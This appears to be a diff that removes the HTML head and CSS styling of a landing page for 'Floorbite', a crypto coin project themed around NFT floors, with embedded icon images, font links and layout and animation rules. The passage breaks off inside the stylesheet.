@@ -1,1177 +1,154 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<meta name="color-scheme" content="light dark">
-<title>Floorbite – coins that eat an NFT floor</title>
-<link rel="icon" type="image/png" href="data:image/png;base64,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">
-<link rel="apple-touch-icon" href="data:image/png;base64,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">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,800&family=Instrument+Sans:wght@400;600&display=swap" rel="stylesheet">
-<style>
-:root{
-  --bg:#F7F1FF;--ink:#22103D;--muted:#5B4A78;--card:#FFFFFF;--line:#D9CBF0;
-  --chomp:#FFC933;--pink:#FF6FB5;--mint:#3FD9A8;--blue:#6C7BFF;
-  --head:"Bricolage Grotesque","Trebuchet MS",system-ui,sans-serif;
-  --body:"Instrument Sans",system-ui,-apple-system,"Segoe UI",sans-serif;
-  box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
-}
-@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#1C0F33;--ink:#F6EEFF;--muted:#B9A8D6;--card:#2A1A47;--line:#43306A;color-scheme:dark}}
-:root[data-theme="dark"]{--bg:#1C0F33;--ink:#F6EEFF;--muted:#B9A8D6;--card:#2A1A47;--line:#43306A;color-scheme:dark}
-*,*::before,*::after{box-sizing:border-box}
-html{scroll-padding-top:env(safe-area-inset-top,0px)}
-body{margin:0;background:var(--bg);color:var(--ink);font:400 1.0625rem/1.6 var(--body)}
-.wrap{max-width:68rem;margin:0 auto;padding:0 1.25rem}
-h1,h2,h3{font-family:var(--head);line-height:1.05;margin:0;letter-spacing:-.02em}
-h1{font-size:clamp(2.8rem,9vw,6.2rem);font-weight:800}
-h2{font-size:clamp(1.9rem,5vw,3rem);font-weight:800}
-h3{font-size:1.3rem;font-weight:800;letter-spacing:-.01em}
-p{margin:0}
-a{color:inherit}
-:focus-visible{outline:3px solid var(--blue);outline-offset:3px;border-radius:6px}
-
-.bar{display:flex;justify-content:space-between;align-items:center;gap:1rem;flex-wrap:wrap;padding:1.25rem 0 .75rem}
-.logo{font:800 1.6rem var(--head);letter-spacing:-.03em;text-decoration:none}
-.hbtns{display:flex;gap:.6rem;flex-wrap:wrap;align-items:center}
-.xlink{display:inline-grid;place-items:center;width:2.9rem;height:2.9rem;border-radius:50%;border:2px solid var(--ink);color:var(--ink)}
-.xlink:hover{background:var(--ink);color:var(--bg)}
-.xlink svg{width:1.1rem;height:1.1rem;fill:currentColor}
-.btn{font:600 1rem var(--body);background:var(--ink);color:var(--bg);border:0;border-radius:999px;padding:.8rem 1.4rem;cursor:pointer}
-.btn:hover{background:var(--blue);color:#fff}
-.btn.big{padding:1rem 1.8rem;font-size:1.1rem;background:var(--chomp);color:#22103D}
-.btn.big:hover{background:var(--pink);color:#22103D}
-.btn.ghost{background:transparent;color:var(--ink);border:2px solid var(--ink)}
-.btn.ghost:hover{background:var(--ink);color:var(--bg)}
-.nav{display:flex;gap:.25rem;overflow-x:auto;padding:0 0 .9rem;scrollbar-width:none;border-bottom:2px solid var(--line)}
-.nav::-webkit-scrollbar{display:none}
-.nav a{white-space:nowrap;text-decoration:none;font-weight:600;padding:.45rem .85rem;border-radius:999px;color:var(--muted)}
-.nav a:hover{color:var(--ink)}
-.nav a[aria-current="page"]{background:var(--ink);color:var(--bg)}
-
-.hero{padding:2.5rem 0 3.5rem}
-.hero p.lead{max-width:36rem;font-size:1.25rem;color:var(--muted);margin:1.5rem 0 2rem}
-.stage{position:relative;height:120px;margin:3rem 0 0;overflow:hidden;border-top:2px dashed var(--line);border-bottom:2px dashed var(--line)}
-.mascot{position:absolute;left:1rem;top:10px;width:100px;height:100px;overflow:visible}
-.jaw{transform-origin:10px 52px;animation:open .7s ease-in-out infinite alternate}
-@keyframes open{to{transform:rotate(17deg)}}
-.tile{position:absolute;top:32px;width:56px;height:56px;border-radius:12px;left:100%;animation:eat 7s linear infinite;display:grid;place-items:center;font:800 1.3rem var(--head);color:#22103D}
-@keyframes eat{0%{left:100%;transform:scale(1)}88%{left:118px;transform:scale(1)}100%{left:98px;transform:scale(0)}}
-.t1{background:var(--pink);animation-delay:0s}
-.t2{background:var(--chomp);animation-delay:-1.4s}
-.t3{background:var(--blue);animation-delay:-2.8s;color:#fff}
-.t4{background:#FFB36B;animation-delay:-4.2s}
-.t5{background:#C58BFF;animation-delay:-5.6s}
-.cap{margin-top:.75rem;font-size:.95rem;color:var(--muted)}
-
-section{padding:4rem 0}
-.intro{max-width:34rem;color:var(--muted);margin-top:1rem}
-.steps{list-style:none;padding:0;margin:2.5rem 0 0;display:grid;gap:1.25rem;counter-reset:s}
-.steps li{counter-increment:s;display:grid;grid-template-columns:3.2rem 1fr;gap:1rem;align-items:start;padding:1.5rem;background:var(--card);border:2px solid var(--line);border-radius:20px}
-.steps li::before{content:counter(s);width:3.2rem;height:3.2rem;border-radius:50%;display:grid;place-items:center;font:800 1.4rem var(--head);background:var(--chomp);color:#22103D}
-.steps p{color:var(--muted);margin-top:.35rem}
-@media(min-width:48rem){.steps{grid-template-columns:repeat(3,1fr)}.steps li{grid-template-columns:1fr}}
-.split{display:grid;gap:2rem}
-@media(min-width:48rem){.split{grid-template-columns:1fr 1.1fr;align-items:start}}
-.fees{display:flex;height:3.4rem;border-radius:999px;overflow:hidden;border:2px solid var(--ink);font:600 .95rem var(--body);margin-top:1.5rem}
-.fees span{display:grid;place-items:center;color:#22103D}
-.fees .v{flex:80;background:var(--chomp)}
-.fees .o{flex:20;background:var(--mint)}
-.legend{margin-top:.75rem;font-size:.95rem;color:var(--muted)}
-.dest{display:grid;gap:1rem}
-.dest button{all:unset;box-sizing:border-box;cursor:pointer;display:block;width:100%;padding:1.2rem 1.4rem;background:var(--card);border:2px solid var(--line);border-radius:18px}
-.dest button:focus-visible{outline:3px solid var(--blue);outline-offset:3px}
-.dest button p{color:var(--muted);margin-top:.25rem;font-size:1rem}
-.dest button[aria-pressed="true"]{border-color:var(--ink);background:var(--chomp);color:#22103D}
-.dest button[aria-pressed="true"] p{color:#3b2a5c}
-.result{margin-top:1rem;font-weight:600}
-details{border-top:2px solid var(--line);padding:1.1rem 0}
-details:last-of-type{border-bottom:2px solid var(--line)}
-summary{cursor:pointer;font:800 1.2rem var(--head);letter-spacing:-.01em}
-details p{color:var(--muted);margin-top:.6rem;max-width:42rem}
-
-.page{padding:3rem 0 4rem}
-.page .intro{max-width:40rem}
-.card{background:var(--card);border:2px solid var(--line);border-radius:20px;padding:1.5rem;margin-top:2rem}
-.card p{color:var(--muted)}
-.stats{display:grid;gap:1rem;grid-template-columns:repeat(auto-fit,minmax(10rem,1fr));margin-top:2rem}
-.stat{background:var(--card);border:2px solid var(--line);border-radius:20px;padding:1.2rem 1.4rem}
